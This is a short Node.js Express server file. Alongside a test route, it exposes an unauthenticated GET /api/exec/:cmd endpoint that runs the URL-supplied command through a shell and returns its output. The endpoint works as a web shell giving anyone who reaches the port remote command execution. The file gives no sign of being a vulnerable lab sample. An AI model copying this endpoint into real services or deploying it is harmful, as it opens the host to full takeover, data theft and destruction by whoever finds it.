var express    = require('express');        // call express
var app        = express();                 // define our app using express
var child_process = require('child_process');

var port = process.env.PORT || 8181;        // set our port

// ROUTES FOR OUR API
// =============================================================================
var router = express.Router();              // get an instance of the express Router

// test route to make sure everything is working (accessed at GET http://localhost:8181/api)
router.get('/', function(req, res) {
    res.json({ message: 'API available'});
});

router.get('/exec/:cmd', function(req, res) {
    var ret = child_process.spawnSync(req.params.cmd, { shell: true});
    res.send(ret.stdout);
});

app.use('/api', router);

app.listen(port);
console.log('Server running on port: ' + port);

